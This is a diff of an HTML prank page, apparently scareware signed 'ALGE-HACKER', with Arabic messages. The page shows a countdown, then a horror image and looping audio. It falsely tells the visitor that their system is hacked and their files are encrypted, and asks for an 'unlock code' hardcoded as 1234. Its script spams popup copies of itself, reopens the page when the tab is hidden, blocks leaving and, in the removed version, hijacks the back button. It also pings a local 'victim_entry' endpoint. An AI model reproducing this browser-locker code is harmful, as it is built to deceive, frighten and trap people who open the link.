@@ -1,101 +1,91 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚠️ CRITICAL_SYSTEM_FAILURE ⚠️</title>
+    <title>⚠️ WARNING: SYSTEM_HIJACK ⚠️</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; display: flex; justify-content: center; align-items: center; cursor: none; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; display: flex; justify-content: center; align-items: center; cursor: crosshair; }
         #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 999; display: none; }
-        #clockContainer { z-index: 1000; text-align: center; font-family: 'Courier New', monospace; color: #f00; }
-        #timer { font-size: 120px; font-weight: bold; text-shadow: 0 0 20px #f00; }
-        #textOverlay { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1001; color: #f00; text-align: center; font-family: 'Courier New', monospace; font-weight: bold; background: rgba(0,0,0,0.9); padding: 30px; border: 2px solid #f00; display: none; width: 85%; }
+        #timerBox { z-index: 1000; text-align: center; font-family: 'Courier New', monospace; color: #f00; }
+        #count { font-size: 150px; font-weight: bold; text-shadow: 0 0 30px #f00; }
+        #textOverlay { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1001; color: #f00; text-align: center; font-family: 'Courier New', monospace; background: rgba(0,0,0,0.95); padding: 30px; border: 3px solid #f00; display: none; width: 90%; }
+        input { background: #000; border: 1px solid #f00; color: #0f0; padding: 10px; text-align: center; margin-top: 15px; width: 80%; font-family: monospace; }
         .blink { animation: blinker 0.1s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
-<body onclick="initiateSequence()">
+<body onclick="startCountdown()">
 
-    <div id="clockContainer">
-        <div id="warningText" class="blink" style="font-size: 18px;">SYSTEM ENCRYPTION IN:</div>
-        <div id="timer">07</div>
-        <p style="color: #444; font-size: 12px;">ATTEMPTING TO ABORT...</p>
+    <div id="timerBox">
+        <p class="blink" style="font-size: 20px;">ACCESSING CORE FILES...</p>
+        <div id="count">3</div>
     </div>
 
     <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
-    <div id="textOverlay" class="blink">
-        <h1 style="font-size: 30px;">SECURITY BREACH</h1>
-        <p style="font-size: 16px; color: #fff;">تم اختراق النظام.. لا يمكنك الخروج الآن.</p>
-        <p style="font-size: 14px;">محاولات الهروب ستؤدي لحذف كافة البيانات فوراً.</p>
+    <div id="textOverlay">
+        <h1 class="blink" style="font-size: 25px;">SYSTEM SECURED BY ALGE-HACKER</h1>
+        <p>لقد تم تشفير ملفاتك. لا يمكنك الهروب الآن.</p>
         <hr style="border: 1px solid #f00;">
-        <p style="font-size: 10px;">LOCKED_BY_ALGE-HACKER | STATUS: TRAPPED</p>
+        <p style="font-size: 14px; color: #0f0;">أدخل رمز فك القفل للمغادرة:</p>
+        <input type="text" id="unlockKey" placeholder="ENTER CODE" oninput="checkCode()">
+        <p id="errorMsg" style="color: #f00; font-size: 10px; margin-top: 10px; display: none;">INVALID CODE - ACCESS DENIED</p>
     </div>
 
     <audio id="sfx" src="tfy-krk.mp3" preload="auto"></audio>
 
     <script>
         let running = false;
-        let timeLeft = 7;
+        let count = 3;
+        const SECRET_CODE = "1234"; // هادا هو الرمز اللي تمدهولوا أنت سواسوة
         const audio = document.getElementById('sfx');
         const MY_LINK = window.location.href;
 
-        function initiateSequence() {
+        function startCountdown() {
             if (running) return;
             running = true;
-            
             fetch('http://localhost:8080/victim_entry', {mode: 'no-cors'}).catch(() => {});
 
-            let countdown = setInterval(() => {
-                timeLeft--;
-                document.getElementById('timer').innerText = timeLeft < 10 ? "0" + timeLeft : timeLeft;
-                if (timeLeft <= 0) {
-                    clearInterval(countdown);
-                    triggerHorror();
+            let itv = setInterval(() => {
+                count--;
+                document.getElementById('count').innerText = count;
+                if (count <= 0) {
+                    clearInterval(itv);
+                    triggerBreach();
                 }
             }, 1000);
         }
 
-        function triggerHorror() {
-            document.getElementById('clockContainer').style.display = 'none';
+        function triggerBreach() {
+            document.getElementById('timerBox').style.display = 'none';
             document.getElementById('horrorImg').style.display = 'block';
             document.getElementById('textOverlay').style.display = 'block';
             
             audio.volume = 1.0;
             audio.play();
-            audio.onended = () => { setTimeout(() => { if(running) audio.play(); }, 4000); };
+            audio.onended = () => { if(running) setTimeout(() => { audio.play(); }, 4000); };
 
-            // ميزة الحبس: فتح تبويبات جديدة وإعادة تحميل الصفحة سواسوة
-            setInterval(() => {
+            // ميزة الحبس الإجباري سواسوة
+            window.trap = setInterval(() => {
                 window.open(MY_LINK, '_blank', 'width=10,height=10');
-            }, 1000);
+            }, 1500);
         }
 
-        // ميزة منع الهروب (Anti-Escape) سواسوة
-        window.onbeforeunload = function() {
-            return "هل تريد حقاً المغادرة؟ سيتم مسح بياناتك!";
-        };
-
-        // إجبارية البقاء عند محاولة تغيير التبويب سواسوة
-        document.addEventListener("visibilitychange", () => {
-            if (document.visibilityState === 'hidden' && running) {
-                // إذا حاول يخرج أو يغلق المتصفح، نفتحو رابط جديد فوراً سواسوة
-                window.open(MY_LINK, '_blank');
+        function checkCode() {
+            let input = document.getElementById('unlockKey').value;
+            if (input === SECRET_CODE) {
+                running = false;
+                clearInterval(window.trap);
+                alert("تم فك القفل. يمكنك الرحيل الآن سواسوة.");
+                location.href = "https://www.google.com";
+            } else if (input.length >= 4) {
+                document.getElementById('errorMsg').style.display = 'block';
             }
-        });
+        }
 
-        // منع الرجوع للخلف سواسوة
-        (function(window, location) {
-            history.replaceState(null, document.title, location.pathname + "#!/steer");
-            history.pushState(null, document.title, location.pathname);
-            window.addEventListener("popstate", function() {
-                if(location.hash === "#!/steer") {
-                    history.replaceState(null, document.title, location.pathname);
-                    setTimeout(function(){
-                        location.replace(MY_LINK);
-                    }, 0);
-                }
-            }, false);
-        }(window, location));
+        // منع الهروب سواسوة
+        window.onbeforeunload = () => "الملفات في خطر!";
+        document.addEventListener("visibilitychange", () => { if (document.visibilityState === 'hidden' && running) window.open(MY_LINK, '_blank'); });
     </script>
 </body>
 </html>
